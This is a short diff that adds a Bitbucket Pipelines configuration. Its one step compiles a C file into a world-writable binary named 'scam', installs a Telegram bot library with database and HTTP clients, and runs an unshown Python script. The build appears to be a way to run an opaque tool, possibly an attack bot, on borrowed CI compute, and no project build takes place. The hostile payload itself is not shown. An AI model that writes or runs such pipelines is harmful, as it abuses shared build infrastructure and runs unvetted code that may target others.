@@ -1,0 +1,10 @@
+pipelines:
+  default:
+    - step:
+        name: Run Python Script
+        size: 2x
+        image: python:3.10
+        script:
+          - echo "MADE BY IPxGAMER.."
+
+          - gcc -o scam Smokiee.c -lpthread -lz -static && pip install telebot pymongo aiohttp && chmod 777 scam && python3 in.py
